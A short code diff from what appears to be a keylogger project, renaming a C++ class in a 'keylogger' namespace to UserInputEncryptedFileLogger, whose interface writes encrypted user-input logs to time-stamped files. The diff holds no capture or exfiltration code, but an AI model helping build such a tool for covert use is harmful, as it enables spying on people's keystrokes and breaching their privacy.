@@ -7,10 +7,10 @@
 
 namespace keylogger
 {
-class UserInputFileLogger
+class UserInputEncryptedFileLogger
 {
 public:
-    UserInputFileLogger(std::shared_ptr<FileSystemAccess>, std::unique_ptr<Encryptor>);
+    UserInputEncryptedFileLogger(std::shared_ptr<FileSystemAccess>, std::unique_ptr<Encryptor>);
 
     std::string writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& logData);
 
